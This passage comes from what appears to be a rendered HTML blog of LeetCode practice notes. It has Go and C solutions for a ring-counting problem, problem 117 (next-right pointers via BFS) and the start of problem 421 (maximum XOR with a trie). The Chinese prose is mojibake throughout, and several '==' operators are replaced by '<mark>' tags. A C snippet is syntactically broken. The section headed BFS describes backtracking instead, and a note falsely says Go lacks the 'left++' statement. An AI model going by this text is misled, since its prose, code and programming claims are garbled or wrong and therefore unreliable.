class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="built_in">len</span>; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> i%<span class="number">2</span> != <span class="number">0</span> &#123;</span><br><span class="line">a := <span class="type">int</span>(rings[i] - <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">b := rings[i<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">switch</span> b &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;R&#x27;</span>:</span><br><span class="line">count[a] |= <span class="number">0</span>b001 <span class="comment">// 0b001</span></span><br><span class="line"><span class="comment">//fmt.Printf(&quot;111ï¼Œ%d\n&quot;, a)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;G&#x27;</span>:</span><br><span class="line">count[a] |= <span class="number">0</span>b010 <span class="comment">// 0b010</span></span><br><span class="line"><span class="comment">//fmt.Printf(&quot;222,%d\n&quot;, a)</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">count[a] |= <span class="number">0</span>b100 <span class="comment">// 0b100</span></span><br><span class="line"><span class="comment">//fmt.Printf(&quot;333ï¼Œ%d\n&quot;, a)</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">x := <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> count[i] &lt;mark&gt; <span class="number">0</span>b111 &#123;</span><br><span class="line">x++</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> x</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//var rings [2*N]char&#123;0&#125;;</span></span><br><span class="line">rings := <span class="string">&quot;B0B6G0R6R0R6G9&quot;</span></span><br><span class="line">result := countPoints(rings)</span><br><span class="line">fmt.Printf(<span class="string">&quot;æœ€ç»ˆçš„ä¸ªæ•°æ˜¯%d\n&quot;</span>, result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„</p></blockquote><ul><li>æŒ‰ä½æˆ–é‚£é‡Œå¯ä»¥ä½¿ç”¨ï¼š<code>1 , ob001 , 0x1</code></li><li>å˜é‡å’Œæ•°ç»„çš„å®šä¹‰ç›´æ¥ç”¨<code>:=</code>æ¥ï¼Œå¾ˆæ–¹ä¾¿</li></ul><hr><h4 id="DAY2-117-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-â…¡"><a href="#DAY2-117-å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ-â…¡" class="headerlink" title="DAY2-117.å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ â…¡"></a>DAY2-117.å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ â…¡</h4><p><mark>ä¸­ç­‰<mark></p><p><a href="https://leetcode.cn/problems/populating-next-right-pointers-in-each-node-ii/description/">117.å¡«å……æ¯ä¸ªèŠ‚ç‚¹çš„ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹æŒ‡é’ˆ â…¡</a></p><h6 id="é¢˜ç›®æè¿°-1"><a href="#é¢˜ç›®æè¿°-1" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h6><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct Node &#123;</span><br><span class="line">int val;</span><br><span class="line">Node *left;</span><br><span class="line">Node *right;</span><br><span class="line">Node *next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œè®©è¿™ä¸ªæŒ‡é’ˆæŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ã€‚å¦‚æœæ‰¾ä¸åˆ°ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œåˆ™å°† next æŒ‡é’ˆè®¾ç½®ä¸º <code>NULL</code> ã€‚</p><p>åˆå§‹çŠ¶æ€ä¸‹ï¼Œæ‰€æœ‰ next æŒ‡é’ˆéƒ½è¢«è®¾ç½®ä¸º <code>NULL</code> ã€‚</p><p><strong>ç¤ºä¾‹ 1ï¼š</strong></p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/117_sample.png" alt="img" style="zoom: 50%;" /><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šroot = [1,2,3,4,5,null,7]</span><br><span class="line">è¾“å‡ºï¼š[1,#,2,3,#,4,5,7,#]</span><br><span class="line">è§£é‡Šï¼šç»™å®šäºŒå‰æ ‘å¦‚å›¾ A æ‰€ç¤ºï¼Œä½ çš„å‡½æ•°åº”è¯¥å¡«å……å®ƒçš„æ¯ä¸ª next æŒ‡é’ˆï¼Œä»¥æŒ‡å‘å…¶ä¸‹ä¸€ä¸ªå³ä¾§èŠ‚ç‚¹ï¼Œå¦‚å›¾ B æ‰€ç¤ºã€‚åºåˆ—åŒ–è¾“å‡ºæŒ‰å±‚åºéå†é¡ºåºï¼ˆç”± next æŒ‡é’ˆè¿æ¥ï¼‰ï¼Œ&#x27;#&#x27; è¡¨ç¤ºæ¯å±‚çš„æœ«å°¾ã€‚</span><br></pre></td></tr></table></figure></blockquote><h6 id="è€ƒç‚¹"><a href="#è€ƒç‚¹" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h6><ul><li>BFS(å¹¿åº¦ä¼˜å…ˆç®—æ³•)</li><li>é“¾è¡¨</li><li>é˜Ÿåˆ—</li></ul><h5 id="å‰ç½®çŸ¥è¯†æ€»ç»“"><a href="#å‰ç½®çŸ¥è¯†æ€»ç»“" class="headerlink" title="å‰ç½®çŸ¥è¯†æ€»ç»“"></a>å‰ç½®çŸ¥è¯†æ€»ç»“</h5><h6 id="BFS"><a href="#BFS" class="headerlink" title="BFS"></a><mark>BFS<mark></h6><blockquote><p> åŸºæœ¬æ€æƒ³</p></blockquote><ul><li>ä¸ºäº†æ±‚å¾—é—®é¢˜çš„è§£ï¼Œå…ˆé€‰æ‹©ä¸€ç§å¯èƒ½çš„æƒ…å†µå‘å‰æ¢ç´¢</li><li>åœ¨æ¢ç´¢è¿‡ç¨‹ä¸­ï¼Œä¸€æ—¦å‘ç°åŸæ¥çš„é€‰æ‹©æ˜¯é”™çš„ï¼Œå°±é€€å›ä¸€æ­¥é‡æ–°é€‰æ‹©ï¼Œç»§ç»­å‘å‰æ¢ç´¢</li><li>å¦‚æ­¤åå¤è¿›è¡Œï¼ŒçŸ¥é“æ‰¾åˆ°è§£æˆ–è€…è¯æ˜æ— è§£</li></ul><blockquote><p>ä»£ç å®ç°[C]</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> a[<span class="number">520</span>];   <span class="comment">//å­˜æ”¾å½“å‰ç»„åˆçš„æ•°ç»„</span></span><br><span class="line"><span class="type">int</span> book[<span class="number">520</span>];   <span class="comment">//æ ‡è®°æ¯ä¸ªæ•°æ˜¯å¦è¢«é€‰ä¸­</span></span><br><span class="line"><span class="type">int</span> ans = <span class="number">0</span>;    <span class="comment">//è®°å½•ç¬¦åˆæ¡ä»¶çš„ç»„åˆæ•°ç›®</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> cur)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(cur &lt;mark&gt; k)&#123;   <span class="comment">//kä¸ªæ•°å·²ç»é€‰å®Œï¼Œå¯ä»¥è¿›è¡Œè¾“å‡ºç­‰æ“ä½œ</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="number">1</span> = <span class="number">0</span>; i&lt;curli++)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, a[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i&lt;n; i++)&#123;    <span class="comment">//éå†nä¸ªæ•°ï¼Œå¹¶ä»ä¸­é€‰æ‹©Kä¸ªæ•°</span></span><br><span class="line">        <span class="keyword">if</span>(!book[i])&#123;       <span class="comment">//è‹¥æ²¡æœ‰è¢«è®¿é—®</span></span><br><span class="line">            book[i] = <span class="number">1</span>;     <span class="comment">//æ ‡è®°ä¸ºè®¿é—®</span></span><br><span class="line">            a[cur] = i;     <span class="comment">//é€‰å®šæœ¬æ•°ï¼Œå¹¶åŠ å…¥æ•°ç»„</span></span><br><span class="line">            DFS(cur + <span class="number">1</span>);     <span class="comment">//é€’å½’ï¼Œcur+1</span></span><br><span class="line">            book[i] = <span class="number">0</span>;     <span class="comment">//é‡Šæ”¾ï¼Œæ ‡è®°ä¸ºæ²¡è¢«è®¿é—®ï¼Œæ–¹ä¾¿ä¸‹æ¬¡å¼•ç”¨</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ€»çš„æ¥è¯´å°±æ˜¯åœ¨ä¸€å †æ’åˆ—çš„æ•°ä¸­æ‰¾ç‰¹å®šé•¿åº¦çš„æ•°æ„æˆçš„é›†åˆ</li></ul><h6 id="äºŒå‰æ ‘çš„å±‚åºéå†"><a href="#äºŒå‰æ ‘çš„å±‚åºéå†" class="headerlink" title="äºŒå‰æ ‘çš„å±‚åºéå†"></a><mark>äºŒå‰æ ‘çš„å±‚åºéå†<mark></h6><p>å°±æ˜¯æŒ‰ç…§é¡ºåºä»ä¸Šåˆ°ä¸‹ä»å·¦åˆ°å³æ‰“å°æ¯ä¸€è¡Œçš„æ•°æ®</p><blockquote><p>é˜Ÿåˆ—å®ç°ï¼š</p></blockquote><p>å…¶å®å°±æ˜¯ä»ä¸Šåˆ°ä¸‹ï¼Œä»å·¦åˆ°å³ä¾æ¬¡å°†æ¯ä¸ªæ•°æ”¾å…¥åˆ°é˜Ÿåˆ—ä¸­ï¼Œç„¶åæŒ‰é¡ºåºä¾æ¬¡æ‰“å°å°±æ˜¯æƒ³è¦çš„ç»“æœã€‚</p><p>å®ç°è¿‡ç¨‹<br>1ã€é¦–å…ˆå°†äºŒå‰æ ‘çš„æ ¹èŠ‚ç‚¹pushåˆ°é˜Ÿåˆ—ä¸­ï¼Œåˆ¤æ–­é˜Ÿåˆ—ä¸ä¸ºNULLï¼Œå°±è¾“å‡ºé˜Ÿå¤´çš„å…ƒç´ ï¼Œ<br>2ã€åˆ¤æ–­èŠ‚ç‚¹å¦‚æœæœ‰å­©å­ï¼Œå°±å°†å­©å­pushåˆ°é˜Ÿåˆ—ä¸­ï¼Œ<br>3ã€éå†è¿‡çš„èŠ‚ç‚¹å‡ºé˜Ÿåˆ—ï¼Œ<br>4ã€å¾ªç¯ä»¥ä¸Šæ“ä½œï¼Œç›´åˆ°Tree  &#x3D;&#x3D;  NULLã€‚</p><p>æŸ¥çœ‹ä¸‹é¢å›¾è§£</p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20180226001828381.png" alt="20180226001828381" style="zoom: 67%;" /><h5 id="Cè¯­è¨€"><a href="#Cè¯­è¨€" class="headerlink" title="Cè¯­è¨€"></a>Cè¯­è¨€</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> val;</span><br><span class="line">  Node *left;</span><br><span class="line">  Node *right;</span><br><span class="line">  Node *next;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> Node *<span class="title function_">connect</span><span class="params">(<span class="keyword">struct</span> Node *root)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!root) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">q</span>[10001];</span></span><br><span class="line">    <span class="type">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    q[right++] = root;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">        <span class="type">int</span> n = right - left;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">last</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> *<span class="title">f</span> =</span> q[left++];</span><br><span class="line">            <span class="keyword">if</span> (f-&gt;left) &#123;</span><br><span class="line">                q[right++] = f-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (f-&gt;right) &#123;</span><br><span class="line">                q[right++] = f-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i != <span class="number">1</span>) &#123;</span><br><span class="line">                last-&gt;next = f;</span><br><span class="line">            &#125;</span><br><span class="line">            last = f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="Goè¯­è¨€"><a href="#Goè¯­è¨€" class="headerlink" title="Goè¯­è¨€"></a>Goè¯­è¨€</h5><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a Node.</span></span><br><span class="line"><span class="comment"> * type Node struct &#123;</span></span><br><span class="line"><span class="comment"> *     Val int</span></span><br><span class="line"><span class="comment"> *     Left *Node</span></span><br><span class="line"><span class="comment"> *     Right *Node</span></span><br><span class="line"><span class="comment"> *     Next *Node</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">connect</span><span class="params">(root *Node)</span></span> *Node &#123;</span><br><span class="line"><span class="keyword">if</span> root &lt;mark&gt; <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> q [<span class="number">10001</span>]*Node</span><br><span class="line">left := <span class="number">0</span></span><br><span class="line">right := <span class="number">0</span></span><br><span class="line">q[right] = root</span><br><span class="line">right++</span><br><span class="line"><span class="keyword">for</span> left &lt; right &#123;</span><br><span class="line">n := right - left</span><br><span class="line"><span class="keyword">var</span> last *Node</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= n; i++ &#123;</span><br><span class="line">f := q[left]</span><br><span class="line">left++</span><br><span class="line"><span class="keyword">if</span> f.Left != <span class="literal">nil</span> &#123;</span><br><span class="line">q[right] = f.Left</span><br><span class="line">right++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> f.Right != <span class="literal">nil</span> &#123;</span><br><span class="line">q[right] = f.Right</span><br><span class="line">right++</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> last != <span class="literal">nil</span> &#123;</span><br><span class="line">last.Next = f</span><br><span class="line">&#125;</span><br><span class="line">last = f</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> root</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h6><ul><li><p>åœ¨Goè¯­è¨€ä¸­ï¼Œæ²¡æœ‰åç½®é€’å¢æ“ä½œç¬¦ <code>left++</code>ã€‚ä½ å¯ä»¥åœ¨è¯­å¥ä¸­åˆ†å¼€å†™ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">go</span><br><span class="line">f := q[left]</span><br><span class="line">left++</span><br></pre></td></tr></table></figure><p>å°†è¿™ä¸¤è¡Œæ›¿æ¢åŸæœ‰çš„ <code>Node *f = q[left++]</code></p></li></ul><hr><h4 id="DAY3-421-æ•°ç»„ä¸­ä¸¤ä¸ªæ•°çš„æœ€å¤§å¼‚æˆ–å€¼"><a href="#DAY3-421-æ•°ç»„ä¸­ä¸¤ä¸ªæ•°çš„æœ€å¤§å¼‚æˆ–å€¼" class="headerlink" title="DAY3-421.æ•°ç»„ä¸­ä¸¤ä¸ªæ•°çš„æœ€å¤§å¼‚æˆ–å€¼"></a>DAY3-421.æ•°ç»„ä¸­ä¸¤ä¸ªæ•°çš„æœ€å¤§å¼‚æˆ–å€¼</h4><p><a href="https://leetcode.cn/problems/maximum-xor-of-two-numbers-in-an-array/">421. æ•°ç»„ä¸­ä¸¤ä¸ªæ•°çš„æœ€å¤§å¼‚æˆ–å€¼</a></p><p><mark>ä¸­ç­‰<mark></p><h6 id="é¢˜ç›®æè¿°-2"><a href="#é¢˜ç›®æè¿°-2" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h6><blockquote><p>ç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ <code>nums</code> ï¼Œè¿”å› <code>nums[i] XOR nums[j]</code> çš„æœ€å¤§è¿ç®—ç»“æœï¼Œå…¶ä¸­ <code>0 â‰¤ i â‰¤ j &lt; n</code> ã€‚</p><p><strong>ç¤ºä¾‹ 1ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [3,10,5,25,2,8]</span><br><span class="line">è¾“å‡ºï¼š28</span><br><span class="line">è§£é‡Šï¼šæœ€å¤§è¿ç®—ç»“æœæ˜¯ 5 XOR 25 = 28.</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2ï¼š</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥ï¼šnums = [14,70,53,83,49,91,36,80,92,51,66,70]</span><br><span class="line">è¾“å‡ºï¼š127</span><br></pre></td></tr></table></figure><p><strong>æç¤ºï¼š</strong></p><ul><li><code>1 &lt;= nums.length &lt;= 2 * 105</code></li><li><code>0 &lt;= nums[i] &lt;= 231 - 1</code></li></ul></blockquote><h6 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h6><ul><li>æš´åŠ›</li><li><mark>å­—å…¸æ ‘(trieæ ‘)<mark></li></ul><h6 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h6><ul><li>æš´åŠ›ï¼šé€ä¸ªæ±‚XORï¼Œåˆ›å»ºä¸€ä¸ªæ•°æ®ç»“æ„ï¼Ÿå­˜æ”¾ä¸¤ä¸ªå€¼å’ŒXORå€¼ï¼Œæ¯”è¾ƒXORï¼Œè¿”å›æœ€å¤§çš„é‚£ä¸€ç»„ã€‚æ—¶é—´å¤æ‚åº¦ï¼šO(N^2)</li><li>å­—å…¸æ ‘ï¼šæ—¶é—´å¤æ‚åº¦ï¼šO(N)</li><li>è´ªå¿ƒç®—æ³•</li></ul><h5 id="Cè¯­è¨€-1"><a href="#Cè¯­è¨€-1" class="headerlink" title="Cè¯­è¨€"></a>Cè¯­è¨€</h5><h6 id="å­—å…¸æ ‘"><a href="#å­—å…¸æ ‘" class="headerlink" title="å­—å…¸æ ‘"></a>å­—å…¸æ ‘</h6><p>æŠ„ä¸€æŠ„leetcodeå®˜æ–¹é¢˜è§£ï¼š</p><blockquote><p>æ ¹æ®æŒ‰ä½å¼‚æˆ–è¿ç®—çš„æ€§è´¨ï¼Œx&#x3D;aiâŠ•ajç­‰ä»·äº aj&#x3D;xâŠ•aiã€‚æˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸€å˜æ¢ï¼Œè®¾è®¡ä¸€ç§ã€Œ<strong>ä»é«˜ä½åˆ°ä½ä½ä¾æ¬¡ç¡®å®š x äºŒè¿›åˆ¶è¡¨ç¤ºçš„æ¯ä¸€ä½</strong>ã€çš„æ–¹æ³•ï¼Œä»¥æ­¤å¾—åˆ° x çš„å€¼ã€‚è¯¥æ–¹æ³•çš„ç²¾é«“åœ¨äºï¼š</p><p> ç”±äºæ•°ç»„ä¸­çš„å…ƒç´ éƒ½åœ¨ [0, 2^{31}) çš„èŒƒå›´å†…ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥å°†æ¯ä¸€ä¸ªæ•°è¡¨ç¤ºä¸ºä¸€ä¸ªé•¿åº¦ä¸º 31 ä½çš„äºŒè¿›åˆ¶æ•°ï¼ˆå¦‚æœä¸æ»¡ 31 ä½ï¼Œåœ¨æœ€é«˜ä½ä¹‹å‰è¡¥ä¸Šè‹¥å¹²ä¸ªå‰å¯¼ 0 å³å¯ï¼‰ï¼›<br> è¿™ 31 ä¸ªäºŒè¿›åˆ¶ä½ä»ä½ä½åˆ°é«˜ä½ä¾æ¬¡ç¼–å·ä¸º 0,1,â‹¯â€‰,30.æˆ‘ä»¬ä»æœ€é«˜ä½ç¬¬ 30 ä¸ªäºŒè¿›åˆ¶ä½å¼€å§‹ï¼Œä¾æ¬¡ç¡®å®š x çš„æ¯ä¸€ä½æ˜¯ 0 è¿˜æ˜¯ 1ï¼›<br> ç”±äºæˆ‘ä»¬éœ€è¦æ‰¾å‡ºæœ€å¤§çš„ xï¼Œå› æ­¤åœ¨æšä¸¾æ¯ä¸€ä½æ—¶ï¼Œæˆ‘ä»¬å…ˆåˆ¤æ–­ x çš„è¿™ä¸€ä½æ˜¯å¦èƒ½å–åˆ° 1ã€‚å¦‚æœèƒ½ï¼Œæˆ‘ä»¬å–è¿™ä¸€ä½ä¸º 1ï¼Œå¦åˆ™æˆ‘ä»¬å–è¿™ä¸€ä½ä¸º 0ã€‚</p><p>ã€Œåˆ¤æ–­ x çš„æŸä¸€ä½æ˜¯å¦èƒ½å–åˆ° 1ã€è¿™ä¸€æ­¥éª¤å¹¶ä¸å®¹æ˜“ã€‚ä¸‹é¢ä»‹ç»ä¸¤ç§åˆ¤æ–­çš„æ–¹æ³•ã€‚</p><p>è¿™é‡Œå…ˆä½¿ç”¨å­—å…¸æ ‘æ¥æ±‚è§£ï¼š</p><p>æ€è·¯ä¸ç®—æ³•</p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥å°†æ•°ç»„ä¸­çš„å…ƒç´ çœ‹æˆé•¿åº¦ä¸º 31 çš„å­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²ä¸­åªåŒ…å« 0 å’Œ 1ã€‚å¦‚æœæˆ‘ä»¬å°†å­—ç¬¦ä¸²æ”¾å…¥å­—å…¸æ ‘ä¸­ï¼Œé‚£ä¹ˆåœ¨å­—å…¸æ ‘ä¸­æŸ¥è¯¢ä¸€ä¸ªå­—ç¬¦ä¸²çš„è¿‡ç¨‹ï¼Œæ°å¥½å°±æ˜¯ä»é«˜ä½å¼€å§‹ç¡®å®šæ¯ä¸€ä¸ªäºŒè¿›åˆ¶ä½çš„è¿‡ç¨‹ã€‚å­—å…¸æ ‘çš„å…·ä½“é€»è¾‘ä»¥åŠå®ç°å¯ä»¥å‚è€ƒã€Œ208. å®ç° Trieï¼ˆå‰ç¼€æ ‘ï¼‰çš„å®˜æ–¹é¢˜è§£ã€ï¼Œè¿™é‡Œæˆ‘ä»¬åªè¯´æ˜å¦‚ä½•ä½¿ç”¨å­—å…¸æ ‘è§£å†³æœ¬é¢˜ã€‚</p><p>æ ¹æ® x&#x3D;aiâŠ•ajï¼Œæˆ‘ä»¬æšä¸¾ aiï¼Œå¹¶å°† a0,a1,â‹¯â€‰,aiâˆ’1 ä½œä¸º ajæ”¾å…¥å­—å…¸æ ‘ä¸­ï¼Œå¸Œæœ›æ‰¾å‡ºä½¿å¾— xè¾¾åˆ°æœ€å¤§å€¼çš„ ajã€‚</p><p>å¦‚ä½•æ±‚å‡º xå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥ä»å­—å…¸æ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹è¿›è¡Œéå†ï¼Œéå†çš„ã€Œå‚ç…§å¯¹è±¡ã€ä¸º aiã€‚åœ¨éå†çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬æ ¹æ® aiçš„ç¬¬ x ä¸ªäºŒè¿›åˆ¶ä½æ˜¯ 0 è¿˜æ˜¯ 1ï¼Œç¡®å®šæˆ‘ä»¬åº”å½“èµ°å‘å“ªä¸ªå­èŠ‚ç‚¹ä»¥ç»§ç»­éå†ã€‚å‡è®¾æˆ‘ä»¬å½“å‰éå†åˆ°äº†ç¬¬ kä¸ªäºŒè¿›åˆ¶ä½ï¼š</p><p> å¦‚æœ ai çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 0ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”å½“å¾€è¡¨ç¤º 1 çš„å­èŠ‚ç‚¹èµ°ï¼Œè¿™æ · 0âŠ•1&#x3D;1ï¼Œå¯ä»¥ä½¿å¾— x çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 1ã€‚å¦‚æœä¸å­˜åœ¨è¡¨ç¤º 1 çš„å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½å¾€è¡¨ç¤º 0 çš„å­èŠ‚ç‚¹èµ°ï¼Œx çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 0ï¼›</p><p> å¦‚æœ ai çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 1ï¼Œé‚£ä¹ˆæˆ‘ä»¬åº”å½“å¾€è¡¨ç¤º 0 çš„å­èŠ‚ç‚¹èµ°ï¼Œè¿™æ · 1âŠ•0&#x3D;1ï¼Œå¯ä»¥ä½¿å¾— x çš„ç¬¬ k ä¸ªäºŒè¿›åˆ¶ä½ä¸º 1ã€‚å¦‚æœä¸å­˜åœ¨è¡¨ç¤º 0 çš„å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½å¾€è¡¨ç¤º 1 